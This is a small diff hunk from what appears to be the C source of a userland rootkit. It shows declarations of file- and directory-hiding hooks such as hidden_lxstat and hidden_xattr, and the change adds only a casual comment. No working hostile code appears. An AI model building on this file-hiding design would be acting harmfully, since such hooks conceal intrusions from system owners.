@@ -17,6 +17,7 @@ int hidden_lxstat(int ver, const char *filename, int mode);
 int hidden_str(const char *str);
 int hiddenDirectory(const char *str);
 
+// im feeling a little parched
 int hidden_xattr(const char *filename)
 {
     #ifdef DEBUG
